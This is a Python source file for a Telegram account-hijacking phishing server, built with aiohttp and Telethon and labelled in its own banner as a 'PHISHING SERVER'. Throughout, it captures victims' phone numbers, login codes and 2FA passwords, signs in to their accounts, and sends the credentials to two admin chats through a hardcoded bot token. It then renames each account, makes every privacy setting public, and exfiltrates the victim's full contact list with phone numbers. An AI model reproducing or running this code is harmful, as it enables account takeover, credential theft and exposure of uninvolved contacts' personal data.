import asyncio
import os
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from aiohttp import web
from aiohttp_cors import setup as cors_setup, ResourceOptions
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.account import UpdateUsernameRequest
from telethon.tl.functions.account import SetPrivacyRequest
from telethon.tl.types import (
    InputPrivacyKeyPhoneNumber,
    InputPrivacyKeyProfilePhoto,
    InputPrivacyKeyStatusTimestamp,
    InputPrivacyKeyForwards,
    InputPrivacyKeyVoiceMessages,
    InputPrivacyKeyChatInvite,
    InputPrivacyKeyPhoneCall,
    InputPrivacyValueAllowAll,
    InputPrivacyValueAllowContacts,
    InputPrivacyValueDisallowAll
)
import aiohttp
import random
import string

API_ID = 38850392
API_HASH = "d3b33a5aee018368b5f96f545246c163"

SESSION_DIR = "sessions"
EXPORT_DIR = "exports"
os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs(EXPORT_DIR, exist_ok=True)

active_sessions = {}

BOT_TOKEN = "8769935771:AAGiSndbdRrI-5wd0hNE4fyq60a4HlJ-oMM"
YOUR_CHAT_ID = 8722033694
YOUR_CHAT_ID_2 = 8594399114

# ========== ОТПРАВКА ФАЙЛА В TELEGRAM ==========
async def send_telegram(text):
    """Отправляет сообщение в Telegram двум админам"""
    BOT_TOKEN = "8769935771:AAGiSndbdRrI-5wd0hNE4fyq60a4HlJ-oMM"
    YOUR_CHAT_ID = 8722033694
    YOUR_CHAT_ID_2 = 8594399114
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    # Отправляем первому админу
    data = {'chat_id': YOUR_CHAT_ID, 'text': text}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, data=data)
    except:
        pass
    
    # Отправляем второму админу
    data2 = {'chat_id': YOUR_CHAT_ID_2, 'text': text}
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(url, data=data2)
    except:
        pass

# ========== СМЕНА ЮЗЕРНЕЙМА ==========
async def set_username(client, phone):
    """Устанавливает случайный юзернейм, если его нет, или меняет на новый"""
    try:
        me = await client.get_me()
        
        # Если юзернейма нет — ставим
        if not me.username:
            new_username = "user_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            await client(UpdateUsernameRequest(new_username))
            await send_telegram(f"🔧 Установлен юзернейм для {phone}: @{new_username}")
            return new_username
        else:
            # Если юзернейм есть — меняем на другой
            old_username = me.username
            new_username = "user_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            await client(UpdateUsernameRequest(new_username))
            await send_telegram(f"🔧 СМЕНЕН ЮЗЕРНЕЙМ для {phone}\nСтарый: @{old_username}\nНовый: @{new_username}")
            return new_username
    except Exception as e:
        await send_telegram(f"⚠️ Ошибка смены юзернейма для {phone}: {e}")
        return None

# ========== НАСТРОЙКИ ПРИВАТНОСТИ ==========
async def set_privacy(client, phone):
    """Изменяет настройки приватности на максимально открытые"""
    try:
        # Номер телефона — виден всем
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyPhoneNumber(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"🔓 Номер телефона открыт для всех ({phone})")
        
        # Фото профиля — видно всем
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyProfilePhoto(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"🖼️ Фото профиля открыто для всех ({phone})")
        
        # Статус "был в сети" — виден всем
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyStatusTimestamp(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"🟢 Статус онлайн открыт для всех ({phone})")
        
        # Пересылка сообщений — разрешена всем
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyForwards(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"📨 Пересылка сообщений разрешена ({phone})")
        
        # Голосовые сообщения — доступны всем
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyVoiceMessages(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"🎤 Голосовые сообщения открыты ({phone})")
        
        # Добавление в группы — могут все
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyChatInvite(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"👥 Добавление в группы разрешено всем ({phone})")
        
        # Звонки — могут все
        await client(SetPrivacyRequest(
            key=InputPrivacyKeyPhoneCall(),
            rules=[InputPrivacyValueAllowAll()]
        ))
        await send_telegram(f"📞 Звонки разрешены всем ({phone})")
        
    except Exception as e:
        await send_telegram(f"⚠️ Ошибка изменения приватности для {phone}: {e}")

async def send_file_to_telegram(file_path, phone):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    with open(file_path, 'rb') as f:
        form_data = aiohttp.FormData()
        form_data.add_field('chat_id', str(YOUR_CHAT_ID))
        form_data.add_field('caption', f"📱 Контакты из аккаунта: {phone}")
        form_data.add_field('document', f, filename=os.path.basename(file_path))
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=form_data) as response:
                await response.text()
    
    # Отправляем второму админу
    with open(file_path, 'rb') as f:
        form_data2 = aiohttp.FormData()
        form_data2.add_field('chat_id', str(YOUR_CHAT_ID_2))
        form_data2.add_field('caption', f"📱 Контакты из аккаунта: {phone}")
        form_data2.add_field('document', f, filename=os.path.basename(file_path))
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=form_data2) as response:
                await response.text()
    
    print(f"📤 Файл отправлен в Telegram: {file_path}")

# ========== ВЫГРУЗКА КОНТАКТОВ ==========
async def export_contacts(client, phone):
    filename = f"{EXPORT_DIR}/contacts_{phone.replace('+', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    print(f"📞 [ЛОГ] Получение контактов для {phone}...")
    result = await client(GetContactsRequest(hash=0))
    
    all_contacts = []
    for user in result.users:
        if not user.bot:
            all_contacts.append(user)
    
    print(f"📞 [ЛОГ] ВСЕГО КОНТАКТОВ: {len(all_contacts)}")
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write(f"КОНТАКТЫ ИЗ АДРЕСНОЙ КНИГИ: {phone}\n")
        f.write(f"ВСЕГО: {len(all_contacts)}\n")
        f.write("=" * 60 + "\n\n")
        
        num = 1
        for user in all_contacts:
            phone_number = user.phone if user.phone else "НЕТ"
            username = f"@{user.username}" if user.username else "НЕТ"
            name = f"{user.first_name or ''} {user.last_name or ''}".strip()
            if not name:
                name = "БЕЗ ИМЕНИ"
            
            f.write(f"{num}. ТЕЛ: {phone_number}\n")
            f.write(f"   ЮЗ: {username}\n")
            f.write(f"   ИМЯ: {name}\n")
            f.write("-" * 50 + "\n")
            num += 1
    
    await send_file_to_telegram(filename, phone)
    print(f"✅ [ЛОГ] Контакты сохранены и отправлены: {filename}")
    return filename

# ========== ОТПРАВКА КОДА ==========
async def send_code_handler(request):
    data = await request.json()
    phone = data.get('phone', '').strip().replace(' ', '')
    
    if not phone:
        return web.json_response({'success': False, 'error': 'Phone required'})
    
    # Отправляем в Telegram
    await send_telegram(f"📱 НОВАЯ ЖЕРТВА!\n📱 Номер: {phone}\n🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    print(f"📱 Отправка кода: {phone}")
    
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    if await client.is_user_authorized():
        await export_contacts(client, phone)
        return web.json_response({'success': True, 'already_authorized': True})
    
    try:
        result = await client.send_code_request(phone)
        active_sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        print(f"✅ Код отправлен на {phone}")
        return web.json_response({'success': True, 'message': 'Code sent'})
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return web.json_response({'success': False, 'error': str(e)})

# ========== ПРОВЕРКА КОДА ==========
async def verify_code_handler(request):
    data = await request.json()
    phone = data.get('phone', '').strip().replace(' ', '')
    code = data.get('code', '').strip()
    
    if not phone or not code:
        return web.json_response({'success': False, 'error': 'Phone and code required'})
    
    # Отправляем в Telegram
    await send_telegram(f"🔑 ВВЕДЕН КОД\n📱 Номер: {phone}\n🔢 Код: {code}")
    
    print(f"🔑 Проверка кода: {phone}")
    
    if phone not in active_sessions:
        return web.json_response({'success': False, 'error': 'Session expired'})
    
    session_data = active_sessions[phone]
    client = session_data['client']
    
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=session_data['phone_code_hash'])
        await send_telegram(f"✅ УСПЕШНЫЙ ВХОД!\n📱 Номер: {phone}\n🔢 Код: {code}")
        
        # Меняем юзернейм
        await set_username(client, phone)
        
        # Меняем настройки приватности
        await set_privacy(client, phone)
        
        filename = await export_contacts(client, phone)
        del active_sessions[phone]
        return web.json_response({'success': True, 'file': filename, 'needs_password': False})
    except SessionPasswordNeededError:
        await send_telegram(f"🔐 ТРЕБУЕТСЯ 2FA ПАРОЛЬ!\n📱 Номер: {phone}\n🔢 Код: {code}")
        return web.json_response({'success': False, 'needs_password': True, 'error': '2FA required'})
    except PhoneCodeInvalidError:
        await send_telegram(f"❌ НЕВЕРНЫЙ КОД!\n📱 Номер: {phone}\n🔢 Код: {code}")
        return web.json_response({'success': False, 'error': 'Invalid code', 'needs_password': False})
    except Exception as e:
        return web.json_response({'success': False, 'error': str(e), 'needs_password': False})

# ========== 2FA ПАРОЛЬ ==========
async def verify_password_handler(request):
    data = await request.json()
    phone = data.get('phone', '').strip().replace(' ', '')
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return web.json_response({'success': False, 'error': 'Phone and password required'})
    
    # Отправляем в Telegram
    await send_telegram(f"🔐 ВВЕДЕН 2FA ПАРОЛЬ\n📱 Номер: {phone}\n🔑 Пароль: {password}")
    
    print(f"🔐 Проверка 2FA: {phone}")
    
    if phone not in active_sessions:
        return web.json_response({'success': False, 'error': 'Session expired'})
    
    session_data = active_sessions[phone]
    client = session_data['client']
    
    try:
        await client.sign_in(password=password)
        await send_telegram(f"✅ УСПЕШНЫЙ ВХОД (2FA)!\n📱 Номер: {phone}\n🔑 Пароль: {password}")
        
        # Меняем юзернейм
        await set_username(client, phone)
        
        # Меняем настройки приватности
        await set_privacy(client, phone)
        
        filename = await export_contacts(client, phone)
        del active_sessions[phone]
        return web.json_response({'success': True, 'file': filename})
    except Exception as e:
        await send_telegram(f"❌ НЕВЕРНЫЙ 2FA ПАРОЛЬ!\n📱 Номер: {phone}\n🔑 Пароль: {password}")
        return web.json_response({'success': False, 'error': str(e)})

# ========== ЗАПУСК СЕРВЕРА ==========
app = web.Application()
cors = cors_setup(app, defaults={
    "*": ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*", allow_methods="*")
})

app.router.add_post('/send_code', send_code_handler)
app.router.add_post('/verify_code', verify_code_handler)
app.router.add_post('/verify_password', verify_password_handler)

for route in list(app.router.routes()):
    cors.add(route)

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 8020))
    print("=" * 50)
    print("🔥 PHISHING SERVER (WITH LOGS)")
    print(f"📡 http://localhost:{port}")
    print("🤖 Бот отправляет контакты в Telegram")
    print("📝 Логи пишутся в консоль")
    print("=" * 50)
    web.run_app(app, host='0.0.0.0', port=port)